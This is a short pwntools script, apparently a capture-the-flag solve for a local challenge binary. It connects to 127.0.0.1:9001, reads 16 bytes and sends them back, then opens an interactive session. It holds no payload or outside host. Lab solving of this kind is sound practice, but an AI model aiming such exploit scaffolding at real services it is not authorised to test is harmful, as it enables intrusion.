#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

p.recv(16)

r = p.recv(16)

p.clean()

p.send(r)

p.interactive()
